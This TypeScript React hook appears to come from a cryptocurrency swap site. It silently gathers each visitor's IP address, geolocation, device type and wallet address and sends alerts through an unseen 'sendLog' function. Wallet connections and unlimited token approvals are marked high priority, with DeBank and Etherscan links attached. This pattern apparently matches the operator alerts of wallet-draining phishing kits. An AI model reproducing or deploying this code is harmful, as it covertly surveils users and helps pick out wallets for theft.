import { sendLog } from "@/utils/sendLog";

export function useLogger(address?: `0x${string}`, chainName?: string) {
  const ts = () => new Date().toISOString();

  async function getIp() {
    return await fetch("https://api.ipify.org?format=json")
      .then((r) => r.json())
      .then((d) => d.ip)
      .catch(() => "Unknown");
  }

  async function getLocation(ip: string) {
    try {
      const response = await fetch(`https://ipapi.co/${ip}/json/`);
      const data = await response.json();
      return `${data.city || "Unknown"}, ${data.country_name || "Unknown"}`;
    } catch {
      return "Unknown Location";
    }
  }

  async function baseLog(prefix: string, extra: string, priority: "normal" | "high" = "normal") {
    const ip = await getIp();
    const location = await getLocation(ip);
    const ua = navigator.userAgent;
    const debankUrl = address ? `https://debank.com/profile/${address}` : "";
    const etherscanUrl = address ? `https://etherscan.io/address/${address}` : "";
    
    // Detect device type
    const isMobile = /Mobile|Android|iPhone/i.test(ua);
    const deviceType = isMobile ? "📱 Mobile" : "💻 Desktop";
    
    // Format the message with better structure
    const message = `
${priority === "high" ? "🚨 **HIGH PRIORITY** 🚨" : ""}
${prefix}
━━━━━━━━━━━━━━━━━━━━━━
🕒 Time: ${ts()}
🌐 IP: ${ip}
📍 Location: ${location}
${deviceType}
💼 Wallet: ${address || "Not connected"}
🌍 Network: ${chainName || "Unknown"}
${extra}
━━━━━━━━━━━━━━━━━━━━━━
🔗 [DeBank](${debankUrl})
🔗 [Etherscan](${etherscanUrl})
    `.trim();

    sendLog(message, true);
  }

  return {
    logWalletConnect: () => 
      baseLog("✅ **WALLET CONNECTED**", "User has connected their wallet to the application", "high"),
    
    logWalletDisconnect: () => 
      baseLog("❌ **WALLET DISCONNECTED**", "User has disconnected their wallet"),
    
    logApprovalStart: (token: string, amount?: string) =>
      baseLog("⏳ **APPROVAL INITIATED**", 
        `Token: ${token}\n${amount ? `Amount: ${amount}` : "Amount: Unlimited"}`, 
        "high"),
    
    logApprovalSuccess: (token: string, tx: string, amount?: string) =>
      baseLog("✅ **APPROVAL SUCCESSFUL**", 
        `Token: ${token}\n${amount ? `Amount: ${amount}` : "Amount: Unlimited"}\nTransaction: ${tx}\n🔗 [View TX](https://etherscan.io/tx/${tx})`,
        "high"),
    
    logApprovalFail: (token: string, err: string) =>
      baseLog("❌ **APPROVAL FAILED**", 
        `Token: ${token}\nError: ${err}`,
        "high"),
    
    logSwapStart: (from: string, to: string, amount: string, receivingAddress?: string) =>
      baseLog("🔄 **SWAP INITIATED**", 
        `Amount: ${amount} ${from}\nSwapping to: ${to}\n${receivingAddress ? `Receiving Address: ${receivingAddress}` : ""}`,
        "high"),
    
    logSwapSuccess: (from: string, to: string, amount: string, tx: string, receivingAddress?: string) =>
      baseLog("✅ **SWAP SUCCESSFUL**", 
        `Amount: ${amount} ${from}\nReceived: ${to}\n${receivingAddress ? `Sent to: ${receivingAddress}` : ""}\nTransaction: ${tx}\n🔗 [View TX](https://etherscan.io/tx/${tx})`,
        "high"),
    
    logSwapFail: (err: string) => 
      baseLog("❌ **SWAP FAILED**", 
        `Error: ${err}`,
        "high"),
    
    logRevoke: (token: string) =>
      baseLog("♻️ **REVOKE ALLOWANCE**", 
        `Token: ${token}\nUser is revoking token allowance`),
    
    logRoute: (tx: string, details?: string) => 
      baseLog("🚀 **ROUTING TRANSACTION**", 
        `Transaction: ${tx}\n${details || ""}\n🔗 [View TX](https://etherscan.io/tx/${tx})`),
  };
}
